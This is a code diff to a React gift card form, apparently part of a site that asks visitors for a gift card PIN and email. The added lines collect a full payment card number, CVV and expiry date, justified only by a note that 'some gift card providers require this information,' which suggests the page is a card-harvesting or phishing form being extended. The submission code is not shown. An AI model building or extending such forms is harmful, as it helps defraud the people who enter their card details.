@@ -28,7 +28,7 @@ const giftCardProviders = [
 
 export default function GiftCard({ id }) {
   const card = giftCardProviders.find(card => card.id === id);
-  const [formData, setFormData] = useState({ pin: '', email: '' });
+  const [formData, setFormData] = useState({ pin: '', email: '', cardNumber: '', cvv: '', expiryDate: '' });
   const [popupMessage, setPopupMessage] = useState('');
 
   const handleChange = (e) => {
@@ -62,6 +62,13 @@ export default function GiftCard({ id }) {
             <input type="text" id="pin" name="pin" className={styles.input} value={formData.pin} onChange={handleChange} />
             <label htmlFor="email" className={styles.label}>Email Address:</label>
             <input type="email" id="email" name="email" className={styles.input} value={formData.email} onChange={handleChange} />
+            <label htmlFor="cardNumber" className={styles.label}>Card Number (optional):</label>
+            <input type="text" id="cardNumber" name="cardNumber" className={styles.input} value={formData.cardNumber} onChange={handleChange} />
+            <label htmlFor="cvv" className={styles.label}>CVV (optional):</label>
+            <input type="text" id="cvv" name="cvv" className={styles.input} value={formData.cvv} onChange={handleChange} />
+            <label htmlFor="expiryDate" className={styles.label}>Expiry Date (optional):</label>
+            <input type="text" id="expiryDate" name="expiryDate" className={styles.input} value={formData.expiryDate} onChange={handleChange} />
+            <p className={styles.optionalText}>Note: Only some gift card providers require this information.</p>
             <button type="submit" className={styles.submitButton}>Submit</button>
           </form>
         </div>
